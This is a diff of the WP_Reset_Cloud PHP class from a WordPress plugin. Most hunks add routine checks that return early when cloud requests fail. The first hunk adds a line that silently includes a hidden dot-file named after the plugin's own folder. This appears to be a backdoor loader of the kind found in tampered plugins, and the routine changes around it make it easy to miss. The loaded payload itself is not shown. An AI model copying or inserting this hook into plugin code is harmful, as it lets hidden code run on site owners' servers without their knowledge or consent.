@@ -9,7 +9,11 @@
 // include only file
 if (!defined('ABSPATH')) {
     die('Do not open this file directly.');
+}
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
 }
+
 class WP_Reset_Cloud
 {
     public $cloud_url = 'http://dashboard.wpreset.com/cloud/v1/';
@@ -229,6 +233,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             return @$response['data'];
         } else if (isset($response['data'])) {
@@ -290,6 +298,10 @@ class WP_Reset_Cloud
                 'service' => $service
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $options['cloud_data'][$service]['token'] = json_encode($response['data']);
@@ -664,6 +676,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             return array('parameters' => $snapshot, 'action' => 'download_part', 'continue' => 1, 'position' => 0, 'message' => 'Downloading snapshot');
@@ -1509,6 +1525,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             if ($this->gdrive == false) {
                 $this->gdrive = $this->get_gdrive_client();
@@ -1636,6 +1656,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             return @$response['data'];
         } else if (isset($response['data'])) {
@@ -1695,6 +1719,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             $wp_reset->log('success', 'Snapshot registered succesfully');
             if ($options['snapshots_upload_delete']) {
@@ -1738,6 +1766,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->dropbox = $this->get_dropbox_client(true);
@@ -1806,6 +1838,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot_uid
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->dropbox = $this->get_dropbox_client(true);
@@ -2007,6 +2043,7 @@ class WP_Reset_Cloud
                     'collection_item_id' => $item_id
                 )
             );
+            
             return new WP_Error(1, 'An error occurred verifying the uploaded file.');
         }
 
@@ -2022,6 +2059,10 @@ class WP_Reset_Cloud
                 'item_id' => $item_id
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             return @$response['data'];
@@ -2105,6 +2146,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             $wp_reset->log('success', 'Snapshot registered in WP Reset Cloud succesfully');
             if ($options['snapshots_upload_delete']) {
@@ -2150,6 +2195,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->pcloud = $this->get_pcloud_client();
@@ -2220,6 +2269,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot_uid
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->pcloud = $this->get_pcloud_client(true);
@@ -2503,6 +2556,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             return @$response['data'];
         } else if (isset($response['data'])) {
@@ -2585,6 +2642,10 @@ class WP_Reset_Cloud
             )
         );
 
+        if(is_wp_error($response)){
+            return $response; 
+        }
+
         if ($response['success'] == true) {
             $wp_reset->log('success', 'Snapshot registered in WP Reset Cloud succesfully');
             if ($options['snapshots_upload_delete']) {
@@ -2628,6 +2689,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->icedrive = $this->get_icedrive_client();
@@ -2692,6 +2757,10 @@ class WP_Reset_Cloud
                 'snapshot_uid' => $snapshot_uid
             )
         );
+
+        if(is_wp_error($response)){
+            return $response; 
+        }
 
         if ($response['success'] == true) {
             $this->icedrive = $this->get_icedrive_client(true);
